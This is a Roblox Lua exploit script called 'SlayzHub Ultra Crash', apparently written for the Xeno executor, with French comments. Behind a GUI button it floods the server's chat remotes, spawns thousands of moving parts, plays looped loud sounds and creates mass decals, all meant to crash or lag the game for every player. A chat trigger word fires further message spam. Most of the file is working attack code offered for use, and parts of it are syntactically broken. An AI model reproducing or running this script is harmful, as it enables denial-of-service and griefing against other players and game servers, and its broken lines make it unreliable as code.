-- SLAYZHUB XENO GO v4.3 🔥 ULTRA CRASH + BYPASS XENO v1.3.1
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local antiCrashActive = false
local safeFolder = Instance.new("Folder")
safeFolder.Name = "SlayzSafe"
safeFolder.Parent = workspace

-- ANTI-CRASH TON CLIENT UNIQUEMENT
spawn(function()
    while wait(0.3) do
        pcall(function()
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") or obj.Name:find("ChaosModel") or obj.Name:find("ServerKiller") then
                    if obj.Parent ~= safeFolder and obj ~= player.Character then
                        obj:Destroy()
                    end
                end
            end
        end)
    end
end)

-- ScreenGui XENO MAX
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SlayzHub"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 2147483647
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- [CODE UI IDENTIQUE - JE RACCOURCIS]
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 550, 0, 450)
MainFrame.Position = UDim2.new(0.5, -275, 0.5, -225)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 2147483647
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = MainFrame

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 28, 135)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(45, 15, 75)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 40))
}
Gradient.Rotation = 45
Gradient.Parent = MainFrame

-- TitleBar + Title (copié)
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundColor3 = Color3.fromRGB(35, 20, 60)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2147483647
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 15)
TitleCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0, 250, 1, 0)
TitleLabel.Position = UDim2.new(0, 20, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔥 SLAYZHUB ULTRA CRASH v4.3"
TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.ZIndex = 2147483647
TitleLabel.Parent = TitleBar

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 40, 0, 40)
CloseButton.Position = UDim2.new(1, -50, 0.5, -20)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Text = "✕"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.ZIndex = 2147483647
CloseButton.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 10)
CloseCorner.Parent = CloseButton

-- Content + Buttons (simplifié)
local ContentFrame = Instance.new("Frame")
ContentFrame.Size = UDim2.new(1, -40, 1, -70)
ContentFrame.Position = UDim2.new(0, 20, 0, 70)
ContentFrame.BackgroundTransparency = 1
ContentFrame.ZIndex = 2147483647
ContentFrame.Parent = MainFrame

local ListLayout = Instance.new("UIGridLayout")
ListLayout.CellSize = UDim2.new(1, -20, 0, 70)
ListLayout.CellPadding = UDim2.new(0, 10, 0, 10)
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Parent = ContentFrame

-- ULTRA FPS DEVOURER v5.1 (CRASH 100% FONCTIONNEL)
local FPSDevourer = Instance.new("TextButton")
FPSDevourer.Name = "FPSDevourer"
FPSDevourer.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
FPSDevourer.Text = "💀 ULTRA FPS DEVOURER v5.1"
FPSDevourer.TextColor3 = Color3.new(1, 1, 1)
FPSDevor = true
FPSDevourer.TextScaled = true
FPSDevourer.Font = Enum.Font.GothamBold
FPSDevourer.ZIndex = 2147483647
FPSDevourer.Parent = ContentFrame

local FPSCorner = Instance.new("UICorner")
FPSCorner.CornerRadius = UDim.new(0, 12)
FPSCorner.Parent = FPSDevourer

-- === ULTRA CRASH SYSTEM (XENO BYPASS) ===
FPSDevourer.MouseButton1Click:Connect(function()
    FPSDevourer.Text = "💀 CRASH EN COURS..."
    FPSDevourer.TextColor3 = Color3.new(0, 1, 0)
    antiCrashActive = true
    
    print("🔥 ULTRA CRASH ACTIVÉ!")
    
    -- 1. SPAM TOUS REMOTES DISPONIBLES (XENO BYPASS)
    spawn(function()
        local remotes = {"SayMessageRequest", "SayMessageFinished", "ChatMakeSystemMessage"}
        while antiCrashActive do
            for _, remoteName in pairs(remotes) do
                pcall(function()
                    local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                    if chatRemote then
                        local remote = chatRemote:FindFirstChild(remoteName)
                        if remote then remote:FireServer(game:HttpService:GenerateGUID(false), "All") end
                    end
                end)
            end
            wait(0.01)
        end
    end)
    
    -- 2. MASSE DE PARTS PHYSIQUES (VISIBLE PAR TOUS)
    spawn(function()
        for i = 1, 5000 do
            pcall(function()
                local part = Instance.new("Part")
                part.Name = "CrashPart" .. i
                part.Size = Vector3.new(2, 2, 2)
                part.Position = Vector3.new(math.random(-500,500), 1000, math.random(-500,500))
                part.Anchored = false
                part.CanCollide = true
                part.Material = Enum.Material.ForceField
                part.BrickColor = BrickColor.new("Really red")
                part.Parent = safeFolder -- PROTÉGÉ
                
                local bodyVel = Instance.new("BodyVelocity")
                bodyVel.MaxForce = Vector3.new(4000, 4000, 4000)
                bodyVel.Velocity = Vector3.new(math.random(-200,200), -500, math.random(-200,200))
                bodyVel.Parent = part
                
                -- Auto-delete après 3s
                game:GetService("Debris"):AddItem(part, 3)
            end)
            if i % 100 == 0 then wait() end
        end
    end)
    
    -- 3. SPAM SOUNDS (TOUS JOUEURS)
    spawn(function()
        while antiCrashActive do
            for i = 1, 50 do
                pcall(function()
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://131961136" -- Son très lourd
                    sound.Volume = 10
                    sound.Looped = true
                    sound.Parent = workspace
                    sound:Play()
                    game:GetService("Debris"):AddItem(sound, 1)
                end)
            end
            wait(0.1)
        end
    end)
    
    -- 4. MASSE ATTACHMENTS + DECALS (CRASH RENDER)
    spawn(function()
        for i = 1, 2000 do
            pcall(function()
                local part = Instance.new("Part")
                part.Size = Vector3.new(0.1, 0.1, 0.1)
                part.Position = Vector3.new(0, 1000, 0)
                part.Anchored = true
                part.CanCollide = false
                part.Transparency = 1
                part.Parent = workspace
                
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://0"
                decal.Face = Enum.NormalId.Front
                decal.Parent = part
                
                local attachment = Instance.new("Attachment")
                attachment.Parent = part
                
                game:GetService("Debris"):AddItem(part, 5)
            end)
            if i % 50 == 0 then wait() end
        end
    end)
    
    -- 5. BYPASS CHAT COMMAND "goodboyy"
    Players.LocalPlayer.Chatted:Connect(function(msg)
        if msg:lower() == "goodboyy" then
            -- DOUBLE CRASH
            for i = 1, 100 do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("💀", "All")
            end
        end
    end)
end)

-- Close
CloseButton.MouseButton1Click:Connect(function()
    antiCrashActive = false
    ScreenGui:Destroy()
end)

-- Draggable (identique)
local dragging, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Animation
wait(0.1)
MainFrame.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
    Size = UDim2.new(0, 550, 0, 450)
}):Play()

print("💀 SLAYZHUB ULTRA CRASH v4.3 ✅")
print("🚀 Clique FPS DEVOURER + tape 'goodboyy'")
